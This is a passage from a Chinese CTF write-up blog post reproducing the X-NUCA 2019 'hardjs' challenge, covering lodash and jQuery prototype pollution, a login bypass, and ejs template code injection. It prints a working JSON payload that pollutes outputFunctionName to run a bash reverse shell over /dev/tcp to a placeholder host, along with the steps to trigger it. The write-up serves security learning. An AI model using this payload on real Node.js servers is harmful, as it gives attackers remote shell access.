+<h6 id="其中的lodash-defaultsDeep-doms-JSON-parse-raws-i-dom-恰好是前段时间公布的CVE-2019-10744的攻击对象，再看一下版本刚好是4-17-11，并没有修复这个漏洞。所以我们可以利用这个漏洞进行原型链污染。"><a href="#其中的lodash-defaultsDeep-doms-JSON-parse-raws-i-dom-恰好是前段时间公布的CVE-2019-10744的攻击对象，再看一下版本刚好是4-17-11，并没有修复这个漏洞。所以我们可以利用这个漏洞进行原型链污染。" class="headerlink" title="其中的lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));恰好是前段时间公布的CVE-2019-10744的攻击对象，再看一下版本刚好是4.17.11，并没有修复这个漏洞。所以我们可以利用这个漏洞进行原型链污染。"></a>其中的<code>lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));</code>恰好是前段时间公布的<code>CVE-2019-10744</code>的攻击对象，再看一下版本刚好是4.17.11，并没有修复这个漏洞。所以我们可以利用这个漏洞进行原型链污染。</h6><h5 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h5><h6 id="参考下面的链接。"><a href="#参考下面的链接。" class="headerlink" title="参考下面的链接。"></a>参考下面的链接。</h6><h5 id="发现利用点"><a href="#发现利用点" class="headerlink" title="发现利用点"></a>发现利用点</h5><h6 id="在server-js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分在server-js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分"><a href="#在server-js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分在server-js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分" class="headerlink" title="在server.js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分在server.js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分"></a>在<code>server.js</code>中，有一处很符合我们要寻找的利用点，即<code>auth</code>函数中判断用户的部分在server.js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">"/login"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="在我们没有登陆以前，req-seesion-login和req-session-userid是undefined的，而session对象的父类肯定包含了Object，所以我们只要修改Object中的这部分代码就可以绕过登陆，以admin身份访问网页。"><a href="#在我们没有登陆以前，req-seesion-login和req-session-userid是undefined的，而session对象的父类肯定包含了Object，所以我们只要修改Object中的这部分代码就可以绕过登陆，以admin身份访问网页。" class="headerlink" title="在我们没有登陆以前，req.seesion.login和req.session.userid是undefined的，而session对象的父类肯定包含了Object，所以我们只要修改Object中的这部分代码就可以绕过登陆，以admin身份访问网页。"></a>在我们没有登陆以前，<code>req.seesion.login</code>和<code>req.session.userid</code>是undefined的，而session对象的父类肯定包含了Object，所以我们只要修改Object中的这部分代码就可以绕过登陆，以admin身份访问网页。</h6><h5 id="尝试XSS攻击"><a href="#尝试XSS攻击" class="headerlink" title="尝试XSS攻击"></a>尝试XSS攻击</h5><h6 id="知道了上述的利用点以后，回去审计robot-py可以发现，flag值是存在环境变量中的，并且是admin的密码，robot会打开本地页面的首页-原先是会自动跳转到-login，当然我们现在可以bypass掉这个跳转-，然后robot会根据form的name填写用户名和密码，并点击submit按钮。"><a href="#知道了上述的利用点以后，回去审计robot-py可以发现，flag值是存在环境变量中的，并且是admin的密码，robot会打开本地页面的首页-原先是会自动跳转到-login，当然我们现在可以bypass掉这个跳转-，然后robot会根据form的name填写用户名和密码，并点击submit按钮。" class="headerlink" title="知道了上述的利用点以后，回去审计robot.py可以发现，flag值是存在环境变量中的，并且是admin的密码，robot会打开本地页面的首页/(原先是会自动跳转到/login，当然我们现在可以bypass掉这个跳转)，然后robot会根据form的name填写用户名和密码，并点击submit按钮。"></a>知道了上述的利用点以后，回去审计<code>robot.py</code>可以发现，flag值是存在环境变量中的，并且是admin的密码，robot会打开本地页面的首页<code>/</code>(原先是会自动跳转到<code>/login</code>，当然我们现在可以bypass掉这个跳转)，然后robot会根据form的name填写用户名和密码，并点击submit按钮。</h6><h6 id="因为首页会自动加载我们保存的html数据，所以这个时候我的思路是可以构造一个form，但是提交地址是自己的服务器，这样就可以接受到来自bot的flag了。"><a href="#因为首页会自动加载我们保存的html数据，所以这个时候我的思路是可以构造一个form，但是提交地址是自己的服务器，这样就可以接受到来自bot的flag了。" class="headerlink" title="因为首页会自动加载我们保存的html数据，所以这个时候我的思路是可以构造一个form，但是提交地址是自己的服务器，这样就可以接受到来自bot的flag了。"></a>因为首页会自动加载我们保存的html数据，所以这个时候我的思路是可以构造一个form，但是提交地址是自己的服务器，这样就可以接受到来自bot的flag了。</h6><h6 id="再加上robot-py中的以下细节，我认为从前端下手应该是出题人预留的预期解之一。"><a href="#再加上robot-py中的以下细节，我认为从前端下手应该是出题人预留的预期解之一。" class="headerlink" title="再加上robot.py中的以下细节，我认为从前端下手应该是出题人预留的预期解之一。"></a>再加上<code>robot.py</code>中的以下细节，我认为从前端下手应该是出题人预留的预期解之一。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chrome_options.add_argument(&apos;--disable-xss-auditor&apos;)</span><br><span class="line">...</span><br><span class="line">    print(client.current_url)</span><br></pre></td></tr></table></figure>
+
+<h6 id="所以审计前端的app-js"><a href="#所以审计前端的app-js" class="headerlink" title="所以审计前端的app.js"></a>所以审计前端的<code>app.js</code></h6><h6 id="发现所有我们保存在数据库的数据是动态加载到一个有sanbox标签的iframe中，这就导致即使我们可以写一个表单，也无法被提交，我们的数据中的js是不会被执行的。"><a href="#发现所有我们保存在数据库的数据是动态加载到一个有sanbox标签的iframe中，这就导致即使我们可以写一个表单，也无法被提交，我们的数据中的js是不会被执行的。" class="headerlink" title="发现所有我们保存在数据库的数据是动态加载到一个有sanbox标签的iframe中，这就导致即使我们可以写一个表单，也无法被提交，我们的数据中的js是不会被执行的。"></a>发现所有我们保存在数据库的数据是动态加载到一个有<code>sanbox</code>标签的iframe中，这就导致即使我们可以写一个表单，也无法被提交，我们的数据中的js是不会被执行的。</h6><h6 id="不过恰巧的是app-js使用的Jquery前段时间也有一个原型链污染漏洞被曝出，而且在页面中也使用到了"><a href="#不过恰巧的是app-js使用的Jquery前段时间也有一个原型链污染漏洞被曝出，而且在页面中也使用到了" class="headerlink" title="不过恰巧的是app.js使用的Jquery前段时间也有一个原型链污染漏洞被曝出，而且在页面中也使用到了"></a>不过恰巧的是<code>app.js</code>使用的Jquery前段时间也有一个原型链污染漏洞被曝出，而且在页面中也使用到了</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0 ;i&lt;datas.length; i++)&#123;</span><br><span class="line">    $.extend(true,allNode,datas[i])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="具体的CVE号是CVE-2019-11358，利用方法类似上文的漏洞。"><a href="#具体的CVE号是CVE-2019-11358，利用方法类似上文的漏洞。" class="headerlink" title="具体的CVE号是CVE-2019-11358，利用方法类似上文的漏洞。"></a>具体的CVE号是CVE-2019-11358，利用方法类似上文的漏洞。</h6><h6 id="官方的payload参考如下："><a href="#官方的payload参考如下：" class="headerlink" title="官方的payload参考如下："></a>官方的payload参考如下：</h6><h6 id="https-github-com-NeSE-Team-OurChallenges-tree-master-XNUCA2019Qualifier-Web-hardjs"><a href="#https-github-com-NeSE-Team-OurChallenges-tree-master-XNUCA2019Qualifier-Web-hardjs" class="headerlink" title="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs"></a><a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs" target="_blank" rel="noopener">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a></h6><h5 id="挖掘后端攻击方法"><a href="#挖掘后端攻击方法" class="headerlink" title="挖掘后端攻击方法"></a>挖掘后端攻击方法</h5><h6 id="请看前文的介绍。"><a href="#请看前文的介绍。" class="headerlink" title="请看前文的介绍。"></a>请看前文的介绍。</h6><h5 id="成功攻击"><a href="#成功攻击" class="headerlink" title="成功攻击"></a>成功攻击</h5><h6 id="可以发现process是可以访问到的，所以我们可以用来反弹shell"><a href="#可以发现process是可以访问到的，所以我们可以用来反弹shell" class="headerlink" title="可以发现process是可以访问到的，所以我们可以用来反弹shell"></a>可以发现process是可以访问到的，所以我们可以用来反弹shell</h6><h6 id="最后的payload如下"><a href="#最后的payload如下" class="headerlink" title="最后的payload如下"></a>最后的payload如下</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;content&quot;: &#123;</span><br><span class="line">        &quot;constructor&quot;: &#123;</span><br><span class="line">            &quot;prototype&quot;: &#123;</span><br><span class="line">            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&apos;child_process&apos;).exec(&apos;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\&quot;&apos;);var __tmp2&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;type&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="发送5次请求，然后访问-get进行原型链污染，最后访问-或-login触发render函数，成功反弹shell并getflag"><a href="#发送5次请求，然后访问-get进行原型链污染，最后访问-或-login触发render函数，成功反弹shell并getflag" class="headerlink" title="发送5次请求，然后访问/get进行原型链污染，最后访问/或/login触发render函数，成功反弹shell并getflag"></a>发送5次请求，然后访问<code>/get</code>进行原型链污染，最后访问<code>/</code>或<code>/login</code>触发<code>render</code>函数，成功反弹shell并getflag</h6><h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><h6 id="通过在这次复现中又学到了很多的东西，感谢各位师傅了。"><a href="#通过在这次复现中又学到了很多的东西，感谢各位师傅了。" class="headerlink" title="通过在这次复现中又学到了很多的东西，感谢各位师傅了。"></a>通过在这次复现中又学到了很多的东西，感谢各位师傅了。</h6><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-expressjs-com-en-api-html-res-cookie"><a href="#https-expressjs-com-en-api-html-res-cookie" class="headerlink" title="https://expressjs.com/en/api.html#res.cookie"></a><a href="https://expressjs.com/en/api.html#res.cookie" target="_blank" rel="noopener">https://expressjs.com/en/api.html#res.cookie</a></h6><h6 id="https-cnodejs-org-topic-55f8d70a20d84f3d377582a3"><a href="#https-cnodejs-org-topic-55f8d70a20d84f3d377582a3" class="headerlink" title="https://cnodejs.org/topic/55f8d70a20d84f3d377582a3"></a><a href="https://cnodejs.org/topic/55f8d70a20d84f3d377582a3" target="_blank" rel="noopener">https://cnodejs.org/topic/55f8d70a20d84f3d377582a3</a></h6><h6 id="https-juejin-im-post-5a24fd8f51882509e5438247"><a href="#https-juejin-im-post-5a24fd8f51882509e5438247" class="headerlink" title="https://juejin.im/post/5a24fd8f51882509e5438247"></a><a href="https://juejin.im/post/5a24fd8f51882509e5438247" target="_blank" rel="noopener">https://juejin.im/post/5a24fd8f51882509e5438247</a></h6><h6 id="https-www-jianshu-com-p-9c952600a741"><a href="#https-www-jianshu-com-p-9c952600a741" class="headerlink" title="https://www.jianshu.com/p/9c952600a741"></a><a href="https://www.jianshu.com/p/9c952600a741" target="_blank" rel="noopener">https://www.jianshu.com/p/9c952600a741</a></h6><h6 id="https-cnodejs-org-topic-5757e80a8316c7cb1ad35bab"><a href="#https-cnodejs-org-topic-5757e80a8316c7cb1ad35bab" class="headerlink" title="https://cnodejs.org/topic/5757e80a8316c7cb1ad35bab"></a><a href="https://cnodejs.org/topic/5757e80a8316c7cb1ad35bab" target="_blank" rel="noopener">https://cnodejs.org/topic/5757e80a8316c7cb1ad35bab</a></h6><h6 id="https-xz-aliyun-com-t-6113-toc-5"><a href="#https-xz-aliyun-com-t-6113-toc-5" class="headerlink" title="https://xz.aliyun.com/t/6113#toc-5"></a><a href="https://xz.aliyun.com/t/6113#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113#toc-5</a></h6><h6 id="https-xz-aliyun-com-t-6101-toc-1"><a href="#https-xz-aliyun-com-t-6101-toc-1" class="headerlink" title="https://xz.aliyun.com/t/6101#toc-1"></a><a href="https://xz.aliyun.com/t/6101#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6101#toc-1</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/08/D-3CTF的赛后复现一/" rel="next" title="D^3CTF的赛后复现一">
+                <i class="fa fa-chevron-left"></i> D^3CTF的赛后复现一
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-ezts"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x02 ezts</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#前置知识如下："><span class="nav-number">1.0.1.1.</span> <span class="nav-text">前置知识如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Express-lodash-ejs-从原型链污染到RCE"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">Express+lodash+ejs: 从原型链污染到RCE</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考链接如下："><span class="nav-number">1.0.1.3.</span> <span class="nav-text">参考链接如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-evi0s-com-2019-08-30-expresslodashejs-e4-bb-8e-e5-8e-9f-e5-9e-8b-e9-93-be-e6-b1-a1-e6-9f-93-e5-88-b0rce"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#RCE-的前提是要有原型链污染，原型链污染原理等具体不再赘述"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">RCE 的前提是要有原型链污染，原型链污染原理等具体不再赘述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过下面的payload来验证当前loadsh库的版本是否有原型链污染。"><span class="nav-number">1.0.1.6.</span> <span class="nav-text">通过下面的payload来验证当前loadsh库的版本是否有原型链污染。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#先来个最简单的应用"><span class="nav-number">1.0.1.7.</span> <span class="nav-text">先来个最简单的应用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#断点打在res-render-39-index-39-这一行，Force-Step-into调试。"><span class="nav-number">1.0.1.8.</span> <span class="nav-text">断点打在res.render(&#39;index&#39;)这一行，Force Step into调试。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到进入了express的response中，获取options，然后触发-app-渲染引擎进行渲染。"><span class="nav-number">1.0.1.9.</span> <span class="nav-text">可以看到进入了express的response中，获取options，然后触发 app 渲染引擎进行渲染。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里又是一系列参数和设置，可以跳过"><span class="nav-number">1.0.1.10.</span> <span class="nav-text">这里又是一系列参数和设置，可以跳过</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里是寻找-app-的渲染引擎。可以看到已经被配置为了-ejs，传递参数和模版文件，开始尝试渲染。"><span class="nav-number">1.0.1.11.</span> <span class="nav-text">这里是寻找 app 的渲染引擎。可以看到已经被配置为了 ejs，传递参数和模版文件，开始尝试渲染。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#调用渲染引擎。到这里，我们已经调试到了-ejs-库中。"><span class="nav-number">1.0.1.12.</span> <span class="nav-text">调用渲染引擎。到这里，我们已经调试到了 ejs 库中。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到很复杂一坨，都是配置渲染设置，不管他，继续调试到-tryHandleCache。"><span class="nav-number">1.0.1.13.</span> <span class="nav-text">可以看到很复杂一坨，都是配置渲染设置，不管他，继续调试到 tryHandleCache。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一堆-Promise-的适配，再看这坨屎一样的-js-我要死了，继续调-handleCache。"><span class="nav-number">1.0.1.14.</span> <span class="nav-text">一堆 Promise 的适配，再看这坨屎一样的 js 我要死了，继续调 handleCache。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#是缓存设置，没啥用，终于调到了编译函数，开始渲染页面了。"><span class="nav-number">1.0.1.15.</span> <span class="nav-text">是缓存设置，没啥用，终于调到了编译函数，开始渲染页面了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#又是设置，跳过，看到实例化一个模版类，然后调用模版的-compile-成员函数，继续跟进。"><span class="nav-number">1.0.1.16.</span> <span class="nav-text">又是设置，跳过，看到实例化一个模版类，然后调用模版的 compile 成员函数，继续跟进。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#看到这里，立刻发现这里有一个代码注入的漏洞"><span class="nav-number">1.0.1.17.</span> <span class="nav-text">看到这里，立刻发现这里有一个代码注入的漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#仔细解释一下："><span class="nav-number">1.0.1.18.</span> <span class="nav-text">仔细解释一下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到，-opts-对象-outputFunctionName-成员在-express-配置的时候并没有给他赋值，默认也是未定义，即-undefined，这样在-574-行时，if-判否，跳过"><span class="nav-number">1.0.1.19.</span> <span class="nav-text">可以看到， opts 对象 outputFunctionName 成员在 express 配置的时候并没有给他赋值，默认也是未定义，即 undefined，这样在 574 行时，if 判否，跳过</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是在我们有原型链污染的前提之下，我们可以控制基类的成员。这样我们给-Object-类创建一个成员-outputFunctionName，这样可以进入-if-语句，并将我们控制的成员-outputFunctionName-赋值为一串恶意代码，从而造成代码注入。在后面模版渲染的时候，注入的代码被执行，也就是这里存在一个代码注入的-RCE"><span class="nav-number">1.0.1.20.</span> <span class="nav-text">但是在我们有原型链污染的前提之下，我们可以控制基类的成员。这样我们给 Object 类创建一个成员 outputFunctionName，这样可以进入 if 语句，并将我们控制的成员 outputFunctionName 赋值为一串恶意代码，从而造成代码注入。在后面模版渲染的时候，注入的代码被执行，也就是这里存在一个代码注入的 RCE</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#至于恶意代码构造就非常简单了。在不考虑后果的情况下，我们可以直接构造如下代码"><span class="nav-number">1.0.1.21.</span> <span class="nav-text">至于恶意代码构造就非常简单了。在不考虑后果的情况下，我们可以直接构造如下代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#放到代码里面看就是"><span class="nav-number">1.0.1.22.</span> <span class="nav-text">放到代码里面看就是</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#拿到shell的代码如下："><span class="nav-number">1.0.1.23.</span> <span class="nav-text">拿到shell的代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可想而知，在污染了原型链之后，渲染直接变成了执行代码，并提前-return，从而-getshell"><span class="nav-number">1.0.1.24.</span> <span class="nav-text">可想而知，在污染了原型链之后，渲染直接变成了执行代码，并提前 return，从而 getshell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注明：上面的过程是我根据，大佬的过程自己走过的，原文链接在上面提供了。"><span class="nav-number">1.0.1.25.</span> <span class="nav-text">注明：上面的过程是我根据，大佬的过程自己走过的，原文链接在上面提供了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于出题人还没有放出环境，那么以后再复现，由于与X-NUCA-2019-hardjs知识点差不多，因此选择复现hardjs。"><span class="nav-number">1.0.1.26.</span> <span class="nav-text">由于出题人还没有放出环境，那么以后再复现，由于与X-NUCA 2019 hardjs知识点差不多，因此选择复现hardjs。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#初步分析"><span class="nav-number">1.0.2.</span> <span class="nav-text">初步分析</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是server-js和robot-py。"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是server.js和robot.py。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#先分析一下server-js。大概的源码已加注释。"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">先分析一下server.js。大概的源码已加注释。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以发现这个服务器是nodejs来搭建的，并且用了express这个框架，模板渲染引擎用了ejs"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">可以发现这个服务器是nodejs来搭建的，并且用了express这个框架，模板渲染引擎用了ejs:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#审计一下代码可以看到有以下的路由："><span class="nav-number">1.0.2.4.</span> <span class="nav-text">审计一下代码可以看到有以下的路由：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#除了-static，-login和-register以外，所以路由在访问的时候都会经过一个auth函数进行身份验证"><span class="nav-number">1.0.2.5.</span> <span class="nav-text">除了/static，/login和/register以外，所以路由在访问的时候都会经过一个auth函数进行身份验证</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。"><span class="nav-number">1.0.2.6.</span> <span class="nav-text">因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#另外在初始化的时候有这么一句"><span class="nav-number">1.0.2.7.</span> <span class="nav-text">另外在初始化的时候有这么一句</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以我们可以通过json格式传递参数到服务端"><span class="nav-number">1.0.2.8.</span> <span class="nav-text">所以我们可以通过json格式传递参数到服务端</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#发现问题"><span class="nav-number">1.0.3.</span> <span class="nav-text">发现问题</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在-get中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">在/get中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其中的lodash-defaultsDeep-doms-JSON-parse-raws-i-dom-恰好是前段时间公布的CVE-2019-10744的攻击对象，再看一下版本刚好是4-17-11，并没有修复这个漏洞。所以我们可以利用这个漏洞进行原型链污染。"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">其中的lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));恰好是前段时间公布的CVE-2019-10744的攻击对象，再看一下版本刚好是4.17.11，并没有修复这个漏洞。所以我们可以利用这个漏洞进行原型链污染。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#原型链污染"><span class="nav-number">1.0.4.</span> <span class="nav-text">原型链污染</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#参考下面的链接。"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">参考下面的链接。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#发现利用点"><span class="nav-number">1.0.5.</span> <span class="nav-text">发现利用点</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在server-js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分在server-js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">在server.js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分在server.js中，有一处很符合我们要寻找的利用点，即auth函数中判断用户的部分</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在我们没有登陆以前，req-seesion-login和req-session-userid是undefined的，而session对象的父类肯定包含了Object，所以我们只要修改Object中的这部分代码就可以绕过登陆，以admin身份访问网页。"><span class="nav-number">1.0.5.2.</span> <span class="nav-text">在我们没有登陆以前，req.seesion.login和req.session.userid是undefined的，而session对象的父类肯定包含了Object，所以我们只要修改Object中的这部分代码就可以绕过登陆，以admin身份访问网页。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#尝试XSS攻击"><span class="nav-number">1.0.6.</span> <span class="nav-text">尝试XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#知道了上述的利用点以后，回去审计robot-py可以发现，flag值是存在环境变量中的，并且是admin的密码，robot会打开本地页面的首页-原先是会自动跳转到-login，当然我们现在可以bypass掉这个跳转-，然后robot会根据form的name填写用户名和密码，并点击submit按钮。"><span class="nav-number">1.0.6.1.</span> <span class="nav-text">知道了上述的利用点以后，回去审计robot.py可以发现，flag值是存在环境变量中的，并且是admin的密码，robot会打开本地页面的首页/(原先是会自动跳转到/login，当然我们现在可以bypass掉这个跳转)，然后robot会根据form的name填写用户名和密码，并点击submit按钮。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 